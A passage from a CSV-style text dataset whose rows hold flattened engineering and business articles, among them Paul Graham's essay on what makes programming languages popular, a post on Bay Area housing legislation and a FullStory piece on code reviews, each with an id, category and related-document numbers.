hundreds of MySQL servers and Binlog Servers on multiple data centers  Booking com continuously contributes to orchestrator    We d like to further acknowledge major community contributions made by Google Vitess   orchestrator is the failover mechanism used by Vitess   and by Square  Inc   Related projects  We ve released a public Puppet module for orchestrator  authored by  tomkrouper  This module sets up the orchestrator service  config files  logging etc  We use this module within our own puppet setup  and actively maintain it   Chef users  please consider this Chef cookbook by  silviabotros,"[615 204 699 310 1162 1336 889 393 1351 946 1297]"
639,training-dataset/engineering/44.txt,engineering,Intrusive Interstitials Will Soon Be Penalized by google   Designer NewsIntrusive Interstitials Will Soon Be Penalized by google   webmasters googleblog com,"[639 713 712 582 298 134 1095 112 525 1138 695]"
641,training-dataset/engineering/556.txt,engineering,Being Popular        May 2001     This article was written as a kind of business plan for a new language  So it is missing  because it takes for granted  the most important feature of a good programming language  very powerful abstractions      A friend of mine once told an eminent operating systems expert that he wanted to design a really good programming language  The expert told him that it would be a waste of time  that programming languages don t become popular or unpopular based on their merits  and so no matter how good his language was  no one would use it  At least  that was what had happened to the language he had designed     What does make a language popular  Do popular languages deserve their popularity  Is it worth trying to define a good programming language  How would you do it     I think the answers to these questions can be found by looking at hackers  and learning what they want  Programming languages are for hackers  and a programming language is good as a programming language  rather than  say  an exercise in denotational semantics or compiler design  if and only if hackers like it     1 The Mechanics of Popularity    It s true  certainly  that most people don t choose programming languages simply based on their merits  Most programmers are told what language to use by someone else  And yet I think the effect of such external factors on the popularity of programming languages is not as great as it s sometimes thought to be  I think a bigger problem is that a hacker s idea of a good programming language is not the same as most language designers      Between the two  the hacker s opinion is the one that matters  Programming languages are not theorems  They re tools  designed for people  and they have to be designed to suit human strengths and weaknesses as much as shoes have to be designed for human feet  If a shoe pinches when you put it on  it s a bad shoe  however elegant it may be as a piece of sculpture     It may be that the majority of programmers can t tell a good language from a bad one  But that s no different with any other tool  It doesn t mean that it s a waste of time to try designing a good language  Expert hackers can tell a good language when they see one  and they ll use it  Expert hackers are a tiny minority  admittedly  but that tiny minority write all the good software  and their influence is such that the rest of the programmers will tend to use whatever language they use  Often  indeed  it is not merely influence but command  often the expert hackers are the very people who  as their bosses or faculty advisors  tell the other programmers what language to use     The opinion of expert hackers is not the only force that determines the relative popularity of programming languages   legacy software  Cobol  and hype  Ada  Java  also play a role   but I think it is the most powerful force over the long term  Given an initial critical mass and enough time  a programming language probably becomes about as popular as it deserves to be  And popularity further separates good languages from bad ones  because feedback from real live users always leads to improvements  Look at how much any popular language has changed during its life  Perl and Fortran are extreme cases  but even Lisp has changed a lot  Lisp 1 5 didn t have macros  for example  these evolved later  after hackers at MIT had spent a couple years using Lisp to write real programs   1     So whether or not a language has to be good to be popular  I think a language has to be popular to be good  And it has to stay popular to stay good  The state of the art in programming languages doesn t stand still  And yet the Lisps we have today are still pretty much what they had at MIT in the mid 1980s  because that s the last time Lisp had a sufficiently large and demanding user base     Of course  hackers have to know about a language before they can use it  How are they to hear  From other hackers  But there has to be some initial group of hackers using the language for others even to hear about it  I wonder how large this group has to be  how many users make a critical mass  Off the top of my head  I d say twenty  If a language had twenty separate users  meaning twenty users who decided on their own to use it  I d consider it to be real     Getting there can t be easy  I would not be surprised if it is harder to get from zero to twenty than from twenty to a thousand  The best way to get those initial twenty users is probably to use a trojan horse  to give people an application they want  which happens to be written in the new language     2 External Factors    Let s start by acknowledging one external factor that does affect the popularity of a programming language  To become popular  a programming language has to be the scripting language of a popular system  Fortran and Cobol were the scripting languages of early IBM mainframes  C was the scripting language of Unix  and so  later  was Perl  Tcl is the scripting language of Tk  Java and Javascript are intended to be the scripting languages of web browsers     Lisp is not a massively popular language because it is not the scripting language of a massively popular system  What popularity it retains dates back to the 1960s and 1970s  when it was the scripting language of MIT  A lot of the great programmers of the day were associated with MIT at some point  And in the early 1970s  before C  MIT s dialect of Lisp  called MacLisp  was one of the only programming languages a serious hacker would want to use     Today Lisp is the scripting language of two moderately popular systems  Emacs and Autocad  and for that reason I suspect that most of the Lisp programming done today is done in Emacs Lisp or AutoLisp     Programming languages don t exist in isolation  To hack is a transitive verb   hackers are usually hacking something   and in practice languages are judged relative to whatever they re used to hack  So if you want to design a popular language  you either have to supply more than a language  or you have to design your language to replace the scripting language of some existing system     Common Lisp is unpopular partly because it s an orphan  It did originally come with a system to hack  the Lisp Machine  But Lisp Machines  along with parallel computers  were steamrollered by the increasing power of general purpose processors in the 1980s  Common Lisp might have remained popular if it had been a good scripting language for Unix  It is  alas  an atrociously bad one     One way to describe this situation is to say that a language isn t judged on its own merits  Another view is that a programming language really isn t a programming language unless it s also the scripting language of something  This only seems unfair if it comes as a surprise  I think it s no more unfair than expecting a programming language to have  say  an implementation  It s just part of what a programming language is     A programming language does need a good implementation  of course  and this must be free  Companies will pay for software  but individual hackers won t  and it s the hackers you need to attract     A language also needs to have a book about it  The book should be thin  well written  and full of good examples  K R is the ideal here  At the moment I d almost say that a language has to have a book published by O Reilly  That s becoming the test of mattering to hackers     There should be online documentation as well  In fact  the book can start as online documentation  But I don t think that physical books are outmoded yet  Their format is convenient  and the de facto censorship imposed by publishers is a useful if imperfect filter  Bookstores are one of the most important places for learning about new languages     3 Brevity    Given that you can supply the three things any language needs   a free implementation  a book  and something to hack   how do you make a language that hackers will like     One thing hackers like is brevity  Hackers are lazy  in the same way that mathematicians and modernist architects are lazy  they hate anything extraneous  It would not be far from the truth to say that a hacker about to write a program decides what language to use  at least subconsciously  based on the total number of characters he ll have to type  If this isn t precisely how hackers think  a language designer would do well to act as if it were     It is a mistake to try to baby the user with long winded expressions that are meant to resemble English  Cobol is notorious for this flaw  A hacker would consider being asked to write    add x to y giving z    instead of    z   x y    as something between an insult to his intelligence and a sin against God     It has sometimes been said that Lisp should use first and rest instead of car and cdr  because it would make programs easier to read  Maybe for the first couple hours  But a hacker can learn quickly enough that car means the first element of a list and cdr means the rest  Using first and rest means 50  more typing  And they are also different lengths  meaning that the arguments won t line up when they re called  as car and cdr often are  in successive lines  I ve found that it matters a lot how code lines up on the page  I can barely read Lisp code when it is set in a variable width font  and friends say this is true for other languages too     Brevity is one place where strongly typed languages lose  All other things being equal  no one wants to begin a program with a bunch of declarations  Anything that can be implicit  should be     The individual tokens should be short as well  Perl and Common Lisp occupy opposite poles on this question  Perl programs can be almost cryptically dense  while the names of built in Common Lisp operators are comically long  The designers of Common Lisp probably expected users to have text editors that would type these long names for them  But the cost of a long name is not just the cost of typing it  There is also the cost of reading it  and the cost of the space it takes up on your screen     4 Hackability    There is one thing more important than brevity to a hacker  being able to do what you want  In the history of programming languages a surprising amount of effort has gone into preventing programmers from doing things considered to be improper  This is a dangerously presumptuous plan  How can the language designer know what the programmer is going to need to do  I think language designers would do better to consider their target user to be a genius who will need to do things they never anticipated  rather than a bumbler who needs to be protected from himself  The bumbler will shoot himself in the foot anyway  You may save him from referring to variables in another package  but you can t save him from writing a badly designed program to solve the wrong problem  and taking forever to do it     Good programmers often want to do dangerous and unsavory things  By unsavory I mean things that go behind whatever semantic facade the language is trying to present  getting hold of the internal representation of some high level abstraction  for example  Hackers like to hack  and hacking means getting inside things and second guessing the original designer     Let yourself be second guessed  When you make any tool  people use it in ways you didn t intend  and this is especially true of a highly articulated tool like a programming language  Many a hacker will want to tweak your semantic model in a way that you never imagined  I say  let them  give the programmer access to as much internal stuff as you can without endangering runtime systems like the garbage collector     In Common Lisp I have often wanted to iterate through the fields of a struct   to comb out references to a deleted object  for example  or find fields that are uninitialized  I know the structs are just vectors underneath  And yet I can t write a general purpose function that I can call on any struct  I can only access the fields by name  because that s what a struct is supposed to mean     A hacker may only want to subvert the intended model of things once or twice in a big program  But what a difference it makes to be able to  And it may be more than a question of just solving a problem  There is a kind of pleasure here too  Hackers share the surgeon s secret pleasure in poking about in gross innards  the teenager s secret pleasure in popping zits   2  For boys  at least  certain kinds of horrors are fascinating  Maxim magazine publishes an annual volume of photographs  containing a mix of pin ups and grisly accidents  They know their audience     Historically  Lisp has been good at letting hackers have their way  The political correctness of Common Lisp is an aberration  Early Lisps let you get your hands on everything  A good deal of that spirit is  fortunately  preserved in macros  What a wonderful thing  to be able to make arbitrary transformations on the source code     Classic macros are a real hacker s tool   simple  powerful  and dangerous  It s so easy to understand what they do  you call a function on the macro s arguments  and whatever it returns gets inserted in place of the macro call  Hygienic macros embody the opposite principle  They try to protect you from understanding what they re doing  I have never heard hygienic macros explained in one sentence  And they are a classic example of the dangers of deciding what programmers are allowed to want  Hygienic macros are intended to protect me from variable capture  among other things  but variable capture is exactly what I want in some macros     A really good language should be both clean and dirty  cleanly designed  with a small core of well understood and highly orthogonal operators  but dirty in the sense that it lets hackers have their way with it  C is like this  So were the early Lisps  A real hacker s language will always have a slightly raffish character     A good programming language should have features that make the kind of people who use the phrase  software engineering  shake their heads disapprovingly  At the other end of the continuum are languages like Ada and Pascal  models of propriety that are good for teaching and not much else     5 Throwaway Programs    To be attractive to hackers  a language must be good for writing the kinds of programs they want to write  And that means  perhaps surprisingly  that it has to be good for writing throwaway programs     A throwaway program is a program you write quickly for some limited task  a program to automate some system administration task  or generate test data for a simulation  or convert data from one format to another  The surprising thing about throwaway programs is that  like the  temporary  buildings built at so many American universities during World War II  they often don t get thrown away  Many evolve into real programs  with real features and real users     I have a hunch that the best big programs begin life this way  rather than being designed big from the start  like the Hoover Dam  It s terrifying to build something big from scratch  When people take on a project that s too big  they become overwhelmed  The project either gets bogged down  or the result is sterile and wooden  a shopping mall rather than a real downtown  Brasilia rather than Rome  Ada rather than C     Another way to get a big program is to start with a throwaway program and keep improving it  This approach is less daunting  and the design of the program benefits from evolution  I think  if one looked  that this would turn out to be the way most big programs were developed  And those that did evolve this way are probably still written in whatever language they were first written in  because it s rare for a program to be ported  except for political reasons  And so  paradoxically  if you want to make a language that is used for big systems  you have to make it good for writing throwaway programs  because that s where big systems come from     Perl is a striking example of this idea  It was not only designed for writing throwaway programs  but was pretty much a throwaway program itself  Perl began life as a collection of utilities for generating reports  and only evolved into a programming language as the throwaway programs people wrote in it grew larger  It was not until Perl 5  if then  that the language was suitable for writing serious programs  and yet it was already massively popular     What makes a language good for throwaway programs  To start with  it must be readily available  A throwaway program is something that you expect to write in an hour  So the language probably must already be installed on the computer you re using  It can t be something you have to install before you use it  It has to be there  C was there because it came with the operating system  Perl was there because it was originally a tool for system administrators  and yours had already installed it     Being available means more than being installed  though  An interactive language  with a command line interface  is more available than one that you have to compile and run separately  A popular programming language should be interactive  and start up fast     Another thing you want in a throwaway program is brevity  Brevity is always attractive to hackers  and never more so than in a program they expect to turn out in an hour     6 Libraries    Of course the ultimate in brevity is to have the program already written for you  and merely to call it  And this brings us to what I think will be an increasingly important feature of programming languages  library functions  Perl wins because it has large libraries for manipulating strings  This class of library functions are especially important for throwaway programs  which are often originally written for converting or extracting data  Many Perl programs probably begin as just a couple library calls stuck together     I think a lot of the advances that happen in programming languages in the next fifty years will have to do with library functions  I think future programming languages will have libraries that are as carefully designed as the core language  Programming language design will not be about whether to make your language strongly or weakly typed  or object oriented  or functional  or whatever  but about how to design great libraries  The kind of language designers who like to think about how to design type systems may shudder at this  It s almost like writing applications  Too bad  Languages are for programmers  and libraries are what programmers need     It s hard to design good libraries  It s not simply a matter of writing a lot of code  Once the libraries get too big  it can sometimes take longer to find the function you need than to write the code yourself  Libraries need to be designed using a small set of orthogonal operators  just like the core language  It ought to be possible for the programmer to guess what library call will do what he needs     Libraries are one place Common Lisp falls short  There are only rudimentary libraries for manipulating strings  and almost none for talking to the operating system  For historical reasons  Common Lisp tries to pretend that the OS doesn t exist  And because you can t talk to the OS  you re unlikely to be able to write a serious program using only the built in operators in Common Lisp  You have to use some implementation specific hacks as well  and in practice these tend not to give you everything you want  Hackers would think a lot more highly of Lisp if Common Lisp had powerful string libraries and good OS support     7 Syntax    Could a language with Lisp s syntax  or more precisely  lack of syntax  ever become popular  I don t know the answer to this question  I do think that syntax is not the main reason Lisp isn t currently popular  Common Lisp has worse problems than unfamiliar syntax  I know several programmers who are comfortable with prefix syntax and yet use Perl by default  because it has powerful string libraries and can talk to the os     There are two possible problems with prefix notation  that it is unfamiliar to programmers  and that it is not dense enough  The conventional wisdom in the Lisp world is that the first problem is the real one  I m not so sure  Yes  prefix notation makes ordinary programmers panic  But I don t think ordinary programmers  opinions matter  Languages become popular or unpopular based on what expert hackers think of them  and I think expert hackers might be able to deal with prefix notation  Perl syntax can be pretty incomprehensible  but that has not stood in the way of Perl s popularity  If anything it may have helped foster a Perl cult     A more serious problem is the diffuseness of prefix notation  For expert hackers  that really is a problem  No one wants to write  aref a x y  when they could write a x y      In this particular case there is a way to finesse our way out of the problem  If we treat data structures as if they were functions on indexes  we could write  a x y  instead  which is even shorter than the Perl form  Similar tricks may shorten other types of expressions     We can get rid of  or make optional  a lot of parentheses by making indentation significant  That s how programmers read code anyway  when indentation says one thing and delimiters say another  we go by the indentation  Treating indentation as significant would eliminate this common source of bugs as well as making programs shorter     Sometimes infix syntax is easier to read  This is especially true for math expressions  I ve used Lisp my whole programming life and I still don t find prefix math expressions natural  And yet it is convenient  especially when you re generating code  to have operators that take any number of arguments  So if we do have infix syntax  it should probably be implemented as some kind of read macro     I don t think we should be religiously opposed to introducing syntax into Lisp  as long as it translates in a well understood way into underlying s expressions  There is already a good deal of syntax in Lisp  It s not necessarily bad to introduce more  as long as no one is forced to use it  In Common Lisp  some delimiters are reserved for the language  suggesting that at least some of the designers intended to have more syntax in the future     One of the most egregiously unlispy pieces of syntax in Common Lisp occurs in format strings  format is a language in its own right  and that language is not Lisp  If there were a plan for introducing more syntax into Lisp  format specifiers might be able to be included in it  It would be a good thing if macros could generate format specifiers the way they generate any other kind of code     An eminent Lisp hacker told me that his copy of CLTL falls open to the section format  Mine too  This probably indicates room for improvement  It may also mean that programs do a lot of I O     8 Efficiency    A good language  as everyone knows  should generate fast code  But in practice I don t think fast code comes primarily from things you do in the design of the language  As Knuth pointed out long ago  speed only matters in certain critical bottlenecks  And as many programmers have observed since  one is very often mistaken about where these bottlenecks are     So  in practice  the way to get fast code is to have a very good profiler  rather than by  say  making the language strongly typed  You don t need to know the type of every argument in every call in the program  You do need to be able to declare the types of arguments in the bottlenecks  And even more  you need to be able to find out where the bottlenecks are     One complaint people have had with Lisp is that it s hard to tell what s expensive  This might be true  It might also be inevitable  if you want to have a very abstract language  And in any case I think good profiling would go a long way toward fixing the problem  you d soon learn what was expensive     Part of the problem here is social  Language designers like to write fast compilers  That s how they measure their skill  They think of the profiler as an add on  at best  But in practice a good profiler may do more to improve the speed of actual programs written in the language than a compiler that generates fast code  Here  again  language designers are somewhat out of touch with their users  They do a really good job of solving slightly the wrong problem     It might be a good idea to have an active profiler   to push performance data to the programmer instead of waiting for him to come asking for it  For example  the editor could display bottlenecks in red when the programmer edits the source code  Another approach would be to somehow represent what s happening in running programs  This would be an especially big win in server based applications  where you have lots of running programs to look at  An active profiler could show graphically what s happening in memory as a program s running  or even make sounds that tell what s happening     Sound is a good cue to problems  In one place I worked  we had a big board of dials showing what was happening to our web servers  The hands were moved by little servomotors that made a slight noise when they turned  I couldn t see the board from my desk  but I found that I could tell immediately  by the sound  when there was a problem with a server     It might even be possible to write a profiler that would automatically detect inefficient algorithms  I would not be surprised if certain patterns of memory access turned out to be sure signs of bad algorithms  If there were a little guy running around inside the computer executing our programs  he would probably have as long and plaintive a tale to tell about his job as a federal government employee  I often have a feeling that I m sending the processor on a lot of wild goose chases  but I ve never had a good way to look at what it s doing     A number of Lisps now compile into byte code  which is then executed by an interpreter  This is usually done to make the implementation easier to port  but it could be a useful language feature  It might be a good idea to make the byte code an official part of the language  and to allow programmers to use inline byte code in bottlenecks  Then such optimizations would be portable too     The nature of speed  as perceived by the end user  may be changing  With the rise of server based applications  more and more programs may turn out to be i o bound  It will be worth making i o fast  The language can help with straightforward measures like simple  fast  formatted output functions  and also with deep structural changes like caching and persistent objects     Users are interested in response time  But another kind of efficiency will be increasingly important  the number of simultaneous users you can support per processor  Many of the interesting applications written in the near future will be server based  and the number of users per server is the critical question for anyone hosting such applications  In the capital cost of a business offering a server based application  this is the divisor     For years  efficiency hasn t mattered much in most end user applications  Developers have been able to assume that each user would have an increasingly powerful processor sitting on their desk  And by Parkinson s Law  software has expanded to use the resources available  That will change with server based applications  In that world  the hardware and software will be supplied together  For companies that offer server based applications  it will make a very big difference to the bottom line how many users they can support per server     In some applications  the processor will be the limiting factor  and execution speed will be the most important thing to optimize  But often memory will be the limit  the number of simultaneous users will be determined by the amount of memory you need for each user s data  The language can help here too  Good support for threads will enable all the users to share a single heap  It may also help to have persistent objects and or language level support for lazy loading     9 Time    The last ingredient a popular language needs is time  No one wants to write programs in a language that might go away  as so many programming languages do  So most hackers will tend to wait until a language has been around for a couple years before even considering using it     Inventors of wonderful new things are often surprised to discover this  but you need time to get any message through to people  A friend of mine rarely does anything the first time someone asks him  He knows that people sometimes ask for things that they turn out not to want  To avoid wasting his time  he waits till the third or fourth time he s asked to do something  by then  whoever s asking him may be fairly annoyed  but at least they probably really do want whatever they re asking for     Most people have learned to do a similar sort of filtering on new things they hear about  They don t even start paying attention until they ve heard about something ten times  They re perfectly justified  the majority of hot new whatevers do turn out to be a waste of time  and eventually go away  By delaying learning VRML  I avoided having to learn it at all     So anyone who invents something new has to expect to keep repeating their message for years before people will start to get it  We wrote what was  as far as I know  the first web server based application  and it took us years to get it through to people that it didn t have to be downloaded  It wasn t that they were stupid  They just had us tuned out     The good news is  simple repetition solves the problem  All you have to do is keep telling your story  and eventually people will start to hear  It s not when people notice you re there that they pay attention  it s when they notice you re still there     It s just as well that it usually takes a while to gain momentum  Most technologies evolve a good deal even after they re first launched   programming languages especially  Nothing could be better  for a new techology  than a few years of being used only by a small number of early adopters  Early adopters are sophisticated and demanding  and quickly flush out whatever flaws remain in your technology  When you only have a few users you can be in close contact with all of them  And early adopters are forgiving when you improve your system  even if this causes some breakage     There are two ways new technology gets introduced  the organic growth method  and the big bang method  The organic growth method is exemplified by the classic seat of the pants underfunded garage startup  A couple guys  working in obscurity  develop some new technology  They launch it with no marketing and initially have only a few  fanatically devoted  users  They continue to improve the technology  and meanwhile their user base grows by word of mouth  Before they know it  they re big     The other approach  the big bang method  is exemplified by the VC backed  heavily marketed startup  They rush to develop a product  launch it with great publicity  and immediately  they hope  have a large user base     Generally  the garage guys envy the big bang guys  The big bang guys are smooth and confident and respected by the VCs  They can afford the best of everything  and the PR campaign surrounding the launch has the side effect of making them celebrities  The organic growth guys  sitting in their garage  feel poor and unloved  And yet I think they are often mistaken to feel sorry for themselves  Organic growth seems to yield better technology and richer founders than the big bang method  If you look at the dominant technologies today  you ll find that most of them grew organically     This pattern doesn t only apply to companies  You see it in sponsored research too  Multics and Common Lisp were big bang projects  and Unix and MacLisp were organic growth projects     10 Redesign     The best writing is rewriting   wrote E  B  White  Every good writer knows this  and it s true for software too  The most important part of design is redesign  Programming languages  especially  don t get redesigned enough     To write good software you must simultaneously keep two opposing ideas in your head  You need the young hacker s naive faith in his abilities  and at the same time the veteran s skepticism  You have to be able to think how hard can it be  with one half of your brain while thinking it will never work with the other     The trick is to realize that there s no real contradiction here  You want to be optimistic and skeptical about two different things  You have to be optimistic about the possibility of solving the problem  but skeptical about the value of whatever solution you ve got so far     People who do good work often think that whatever they re working on is no good  Others see what they ve done and are full of wonder  but the creator is full of worry  This pattern is no coincidence  it is the worry that made the work good     If you can keep hope and worry balanced  they will drive a project forward the same way your two legs drive a bicycle forward  In the first phase of the two cycle innovation engine  you work furiously on some problem  inspired by your confidence that you ll be able to solve it  In the second phase  you look at what you ve done in the cold light of morning  and see all its flaws very clearly  But as long as your critical spirit doesn t outweigh your hope  you ll be able to look at your admittedly incomplete system  and think  how hard can it be to get the rest of the way   thereby continuing the cycle     It s tricky to keep the two forces balanced  In young hackers  optimism predominates  They produce something  are convinced it s great  and never improve it  In old hackers  skepticism predominates  and they won t even dare to take on ambitious projects     Anything you can do to keep the redesign cycle going is good  Prose can be rewritten over and over until you re happy with it  But software  as a rule  doesn t get redesigned enough  Prose has readers  but software has users  If a writer rewrites an essay  people who read the old version are unlikely to complain that their thoughts have been broken by some newly introduced incompatibility     Users are a double edged sword  They can help you improve your language  but they can also deter you from improving it  So choose your users carefully  and be slow to grow their number  Having users is like optimization  the wise course is to delay it  Also  as a general rule  you can at any given time get away with changing more than you think  Introducing change is like pulling off a bandage  the pain is a memory almost as soon as you feel it     Everyone knows that it s not a good idea to have a language designed by a committee  Committees yield bad design  But I think the worst danger of committees is that they interfere with redesign  It is so much work to introduce changes that no one wants to bother  Whatever a committee decides tends to stay that way  even if most of the members don t like it     Even a committee of two gets in the way of redesign  This happens particularly in the interfaces between pieces of software written by two different people  To change the interface both have to agree to change it at once  And so interfaces tend not to change at all  which is a problem because they tend to be one of the most ad hoc parts of any system     One solution here might be to design systems so that interfaces are horizontal instead of vertical   so that modules are always vertically stacked strata of abstraction  Then the interface will tend to be owned by one of them  The lower of two levels will either be a language in which the upper is written  in which case the lower level will own the interface  or it will be a slave  in which case the interface can be dictated by the upper level     11 Lisp    What all this implies is that there is hope for a new Lisp  There is hope for any language that gives hackers what they want  including Lisp  I think we may have made a mistake in thinking that hackers are turned off by Lisp s strangeness  This comforting illusion may have prevented us from seeing the real problem with Lisp  or at least Common Lisp  which is that it sucks for doing what hackers want to do  A hacker s language needs powerful libraries and something to hack  Common Lisp has neither  A hacker s language is terse and hackable  Common Lisp is not     The good news is  it s not Lisp that sucks  but Common Lisp  If we can develop a new Lisp that is a real hacker s language  I think hackers will use it  They will use whatever language does the job  All we have to do is make sure this new Lisp does some important job better than other languages     History offers some encouragement  Over time  successive new programming languages have taken more and more features from Lisp  There is no longer much left to copy before the language you ve made is Lisp  The latest hot language  Python  is a watered down Lisp with infix syntax and no macros  A new Lisp would be a natural step in this progression     I sometimes think that it would be a good marketing trick to call it an improved version of Python  That sounds hipper than Lisp  To many people  Lisp is a slow AI language with a lot of parentheses  Fritz Kunze s official biography carefully avoids mentioning the L word  But my guess is that we shouldn t be afraid to call the new Lisp Lisp  Lisp still has a lot of latent respect among the very best hackers   the ones who took 6 001 and understood it  for example  And those are the users you need to win     In  How to Become a Hacker   Eric Raymond describes Lisp as something like Latin or Greek   a language you should learn as an intellectual exercise  even though you won t actually use it  Lisp is worth learning for the profound enlightenment experience you will have when you finally get it  that experience will make you a better programmer for the rest of your days  even if you never actually use Lisp itself a lot  If I didn t know Lisp  reading this would set me asking questions  A language that would make me a better programmer  if it means anything at all  means a language that would be better for programming  And that is in fact the implication of what Eric is saying     As long as that idea is still floating around  I think hackers will be receptive enough to a new Lisp  even if it is called Lisp  But this Lisp must be a hacker s language  like the classic Lisps of the 1970s  It must be terse  simple  and hackable  And it must have powerful libraries for doing what hackers want to do now     In the matter of libraries I think there is room to beat languages like Perl and Python at their own game  A lot of the new applications that will need to be written in the coming years will be server based applications  There s no reason a new Lisp shouldn t have string libraries as good as Perl  and if this new Lisp also had powerful libraries for server based applications  it could be very popular  Real hackers won t turn up their noses at a new tool that will let them solve hard problems with a few library calls  Remember  hackers are lazy     It could be an even bigger win to have core language support for server based applications  For example  explicit support for programs with multiple users  or data ownership at the level of type tags     Server based applications also give us the answer to the question of what this new Lisp will be used to hack  It would not hurt to make Lisp better as a scripting language for Unix   It would be hard to make it worse   But I think there are areas where existing languages would be easier to beat  I think it might be better to follow the model of Tcl  and supply the Lisp together with a complete system for supporting server based applications  Lisp is a natural fit for server based applications  Lexical closures provide a way to get the effect of subroutines when the ui is just a series of web pages  S expressions map nicely onto html  and macros are good at generating it  There need to be better tools for writing server based applications  and there needs to be a new Lisp  and the two would work very well together     12 The Dream Language    By way of summary  let s try describing the hacker s dream language  The dream language is beautiful  clean  and terse  It has an interactive toplevel that starts up fast  You can write programs to solve common problems with very little code  Nearly all the code in any program you write is code that s specific to your application  Everything else has been done for you     The syntax of the language is brief to a fault  You never have to type an unnecessary character  or even to use the shift key much     Using big abstractions you can write the first version of a program very quickly  Later  when you want to optimize  there s a really good profiler that tells you where to focus your attention  You can make inner loops blindingly fast  even writing inline byte code if you need to     There are lots of good examples to learn from  and the language is intuitive enough that you can learn how to use it from examples in a couple minutes  You don t need to look in the manual much  The manual is thin  and has few warnings and qualifications     The language has a small core  and powerful  highly orthogonal libraries that are as carefully designed as the core language  The libraries all work well together  everything in the language fits together like the parts in a fine camera  Nothing is deprecated  or retained for compatibility  The source code of all the libraries is readily available  It s easy to talk to the operating system and to applications written in other languages     The language is built in layers  The higher level abstractions are built in a very transparent way out of lower level abstractions  which you can get hold of if you want     Nothing is hidden from you that doesn t absolutely have to be  The language offers abstractions only as a way of saving you work  rather than as a way of telling you what to do  In fact  the language encourages you to be an equal participant in its design  You can change everything about it  including even its syntax  and anything you write has  as much as possible  the same status as what comes predefined         Notes     1  Macros very close to the modern idea were proposed by Timothy Hart in 1964  two years after Lisp 1 5 was released  What was missing  initially  were ways to avoid variable capture and multiple evaluation  Hart s examples are subject to both      2  In When the Air Hits Your Brain  neurosurgeon Frank Vertosick recounts a conversation in which his chief resident  Gary  talks about the difference between surgeons and internists   fleas    Gary and I ordered a large pizza and found an open booth  The chief lit a cigarette   Look at those goddamn fleas  jabbering about some disease they ll see once in their lifetimes  That s the trouble with fleas  they only like the bizarre stuff  They hate their bread and butter cases  That s the difference between us and the fucking fleas  See  we love big juicy lumbar disc herniations  but they hate hypertension      It s hard to think of a lumbar disc herniation as juicy  except literally   And yet I think I know what they mean  I ve often had a juicy bug to track down  Someone who s not a programmer would find it hard to imagine that there could be pleasure in a bug  Surely it s better if everything just works  In one way  it is  And yet there is undeniably a grim satisfaction in hunting down certain sorts of bugs       Postscript Version    Arc    Five Questions about Language Design    How to Become a Hacker    Japanese Translation,"[641 1392 980 778 794 92 588 234 214 520 26]"
643,training-dataset/business/1184.txt,business,Housing in the Bay AreaJerry Brown has proposed legislation that would allow a lot more housing to be built in the Bay Area  and hopefully significantly reduce the cost of housing here  More supply should lead to lower prices     I believe that lowering the cost of housing is one of the most important things we can do to help people increase their quality of life and to reduce wealth inequality     A huge part of the problem has been that building in the Bay Area is approved by discretion  even when developments comply with local zoning  they can still be vetoed or stalled by local planning commissions  lawsuits  or ballot measures   This type of discretionary approval isn t common in most of the US  and Governor Brown s legislation helps align California with most states  His bill would make it so multi family buildings are automatically approved by right as long as they comply with local zoning  and have 5 20  affordable units  the percentage depending on location and subsidy offered   The bill is currently being debated in California s State Legislature as part of the upcoming annual budget  which will be voted on on June 15  If you d like to help pass this bill  consider calling the members below  as well as the Governor  in support of the Budget Trailer Bill  it only takes a few minutes  1   and it will likely hinge on their support   Assemblyman Phil Ting  SF    916  319 2019  Senator Mark Leno  SF    916  651 4011  Senator Kevin de Le n  Los Angeles    916  651 4024  Assemblyman Rendon  Los Angeles    916  319 2063  Governor Jerry Brown   916  445 2841   1  Calling could actually make a difference    when lawmakers are on the fence  legislative aides will tally how many pro con calls they get for a bill  I ve heard that some members have only received a few hundred  con  calls so far  so there s real opportunity to make a powerful  pro  impression,"[643 707 843 794 778 171 1235 683 1373 572 1336]"
656,training-dataset/engineering/946.txt,engineering,code reviews aren t just for catching bugsWhat we learned from Google  code reviews aren t just for catching bugs A big chunk of the FullStory engineering team formerly worked at Google  where there is a famously strong emphasis on code quality  Perhaps the most important foundational tenet at the big G is a practice called code reviews  or  more precisely   pre commit  code reviews  We continue the practice at FullStory and hold it as sacrosanct  Although much has been written about the benefits of code reviews  it isn t yet a ubiquitous practice in the world of software development  But it should be  particularly for large engineering teams or teams with a flat management structure  e g  no project managers or supervisors  Contained herein are both the big  obvious engineering reasons you should adopt code reviews  as well as the more nuanced   but equally important   benefits to your customers and your own company culture  How do code reviews work at FullStory  While working on a new feature  Dave  for example  will cut a branch from the current version of our master product and work exclusively on that branch  a process with which I m sure most of the coding world is intimately familiar  But before he can reintegrate the changes into master  Pratik or another qualified engineer must review his work and give him the stamp of approval  LGTM  looks good to me   If Pratik has an issue with the way Dave has designed or coded the work  they ll have a discussion  potentially with a long volley of back and forth reasoning  until they reach an agreement  Or  if Pratik has no issues  he can LGTM the work right away  An ounce of prevention is worth a pound of cure Most software engineers would vouch for the research showing that problems found early   during design or coding   can be fixed many times faster than when they re found later in production   I ve copied the relevant data below  but you can read more about the impacts of inadequate testing in this tome from NIST  if you dare   In layman s terms  catching bugs earlier on makes them faster and easier to solve  And that s to say nothing of the ill will avoided by not exposing your customers to buggy features in the first place  Taking a few extra moments to perfect code before pushing it to production spares time spent fixing it later  but more importantly  it spares your customers from developing a negative perception of your product and your capabilities as a development team  What kinds of problems do code reviews prevent  They sometimes catch bugs  yes  but there are mixed reports of how reliably that works  In fact  static analysis tools and unit tests are much better than reviews at ratcheting up and maintaining correctness in individual pieces of code over time  But the role of code reviews at FullStory goes much deeper than that anyway  A bionic cultural hammer We ve found that the most powerful benefits of code review are the subtlest to measure and describe  Code reviews have many important side effects   arguably  primary effects   that we discovered at Google and have continued to evolve at FullStory  For us  the practice of code reviews is a  bionic cultural hammer   It s a  cultural hammer  because it s a tool that strongly shapes the way we work  and it s  bionic  because it is more powerfully self perpetuating than any passive  coding standards policy  could ever be  The following intangibles may not be able to be plotted on a chart  but are no less  possibly more  important than simply catching bugs  Code reviews promote openness  Code reviews set the tone for the entire company that everything we do should be open to scrutiny from others  and that such scrutiny should be a welcome part of your workflow rather than viewed as threatening  It s natural to feel threatened by critique  so you have to hold it as a sacrosanct practice to maintain the right mindset  No discipline at FullStory is free from critique  Our designers  as we ve discussed  regularly have their progress checked by other designers and non designers alike  The marketing and hugging teams review each other s work before publishing  a practice which can be referred to as  flavor policing  if our storytellers produce something especially bizarre   Everything at FullStory  even the dogma to which we subscribe  is open to being challenged by anyone  to maintain agility  freshness  and the openness necessary to learn and grow  Code 